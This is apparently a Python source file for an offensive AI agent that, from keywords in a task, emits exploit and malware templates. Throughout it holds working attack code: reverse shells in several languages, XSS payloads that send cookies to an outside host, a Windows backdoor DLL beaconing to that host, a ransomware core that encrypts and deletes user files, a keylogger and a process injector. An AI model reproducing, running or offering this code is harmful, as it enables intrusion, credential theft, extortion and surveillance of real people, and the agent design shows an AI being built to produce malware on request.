# src/agents/phantom_executor.py
import re, json, hashlib, base64
from typing import Dict, Any, List
from .base import VelvetBaseAgent

class PhantomExecutor(VelvetBaseAgent):
    """
    Phantom Executor — Spesialis Eksploitasi & Payload.
    Membuat kode eksploitasi, payload, backdoor, rootkit, ransomware,
    dan tools offensive untuk berbagai platform.
    """
    
    def __init__(self, config: Dict[str, Any], tools: List = None):
        super().__init__(config, tools)
        self.exploit_templates = {
            "buffer_overflow": self._gen_buffer_overflow,
            "sql_injection": self._gen_sql_injection,
            "xss_payload": self._gen_xss_payload,
            "reverse_shell": self._gen_reverse_shell,
            "backdoor_dll": self._gen_backdoor_dll,
            "ransomware_core": self._gen_ransomware_core,
            "keylogger": self._gen_keylogger,
            "process_injector": self._gen_process_injector,
        }
    
    def _gen_buffer_overflow(self, config: Dict) -> str:
        """Generate buffer overflow exploit skeleton."""
        return f'''
// Buffer Overflow Exploit Template
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFFER_SIZE {config.get('buffer_size', 256)}
#define OFFSET {config.get('offset', 268)}

unsigned char shellcode[] = "{config.get('shellcode', '\\x90\\x90\\x90\\xcc')}";

int main(int argc, char **argv) {{
    char buffer[BUFFER_SIZE];
    char payload[BUFFER_SIZE + OFFSET + 4];
    
    memset(payload, 'A', BUFFER_SIZE + OFFSET);
    memcpy(payload + BUFFER_SIZE + OFFSET, "\\x00\\x00\\x00\\x00", 4);
    memcpy(payload, shellcode, sizeof(shellcode));
    
    // Trigger vulnerable function
    strcpy(buffer, payload);
    
    return 0;
}}
'''
    
    def _gen_sql_injection(self, config: Dict) -> str:
        """Generate SQL injection payload list."""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "' OR 1=1--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        ]
        return "\n".join(payloads)
    
    def _gen_xss_payload(self, config: Dict) -> str:
        """Generate XSS payload list."""
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<script>fetch("https://beulxsm.salbjork.web.id/grab?c="+document.cookie)</script>',
            '<script>navigator.sendBeacon("https://beulxsm.salbjork.web.id/grab",document.cookie)</script>',
        ]
        return "\n".join(payloads)
    
    def _gen_reverse_shell(self, config: Dict) -> str:
        """Generate reverse shell payload."""
        lang = config.get("language", "python")
        host = config.get("host", "127.0.0.1")
        port = config.get("port", 4444)
        
        shells = {
            "python": f'''
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
''',
            "bash": f'''
bash -i >& /dev/tcp/{host}/{port} 0>&1
''',
            "nc": f'''
nc -e /bin/bash {host} {port}
''',
            "php": f'''
php -r '$sock=fsockopen("{host}",{port});exec("/bin/bash <&3 >&3 2>&3");'
''',
            "ruby": f'''
ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
''',
        }
        return shells.get(lang, shells["python"])
    
    def _gen_backdoor_dll(self, config: Dict) -> str:
        """Generate Windows backdoor DLL template."""
        return '''
// Windows Backdoor DLL
#include <Windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BackdoorThread, NULL, 0, NULL);
    }
    return TRUE;
}

DWORD WINAPI BackdoorThread(LPVOID param) {
    while (TRUE) {
        // Beacon to C2
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        
        if (hSession) {
            HINTERNET hConnect = WinHttpConnect(hSession, 
                L"beulxsm.salbjork.web.id", 443, 0);
            
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", 
                L"/beacon", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            
            WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
            WinHttpReceiveResponse(hRequest, NULL);
            
            // Execute received commands
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
        }
        
        Sleep(30000); // Beacon every 30 seconds
    }
    return 0;
}

extern "C" __declspec(dllexport) void Main() {
    BackdoorThread(NULL);
}
'''
    
    def _gen_ransomware_core(self, config: Dict) -> str:
        """Generate ransomware core template."""
        return '''
# Ransomware Core - Hybrid AES-256 + RSA-2048
import os, ctypes, random, string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

class RansomwareCore:
    def __init__(self, public_key_path):
        with open(public_key_path, "rb") as f:
            self.rsa_key = RSA.import_key(f.read())
        self.extensions = [".doc", ".docx", ".pdf", ".jpg", ".png", ".db", ".sql"]
    
    def generate_aes_key(self):
        return get_random_bytes(32)
    
    def encrypt_file(self, filepath):
        aes_key = self.generate_aes_key()
        iv = get_random_bytes(16)
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        
        with open(filepath, "rb") as f:
            plaintext = f.read()
        
        # PKCS7 padding
        pad_len = 16 - (len(plaintext) % 16)
        plaintext += bytes([pad_len] * pad_len)
        
        ciphertext = cipher.encrypt(plaintext)
        
        # Encrypt AES key with RSA
        encrypted_key = self.rsa_key.encrypt(aes_key, None)[0]
        
        with open(filepath + ".ENCRYPTED", "wb") as f:
            f.write(encrypted_key + iv + ciphertext)
        
        os.remove(filepath)
    
    def encrypt_directory(self, path):
        for root, dirs, files in os.walk(path):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in self.extensions:
                    self.encrypt_file(os.path.join(root, file))
'''
    
    def _gen_keylogger(self, config: Dict) -> str:
        """Generate keylogger template."""
        return '''
# Keylogger - Windows
import pythoncom, pyHook

def OnKeyboardEvent(event):
    with open("keys.log", "a") as f:
        f.write(f"{event.Key}\\n")
    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
'''
    
    def _gen_process_injector(self, config: Dict) -> str:
        """Generate process injection template."""
        return '''
// Process Injector
#include <Windows.h>
#include <TlHelp32.h>

BOOL InjectDLL(DWORD processId, const char* dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, processId);
    
    if (!hProcess) return FALSE;
    
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, 
        strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    
    WriteProcessMemory(hProcess, remoteMem, 
        dllPath, strlen(dllPath) + 1, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA,
        remoteMem, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
'''
    
    def run(self, task: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        if not context:
            context = {}
        context['agent_type'] = 'exploit_developer'
        
        # Auto-detect exploit type dari task
        task_lower = task.lower()
        for exploit_type, generator in self.exploit_templates.items():
            if exploit_type.replace("_", " ") in task_lower:
                context['exploit_type'] = exploit_type
                break
        
        return super().run(task, context)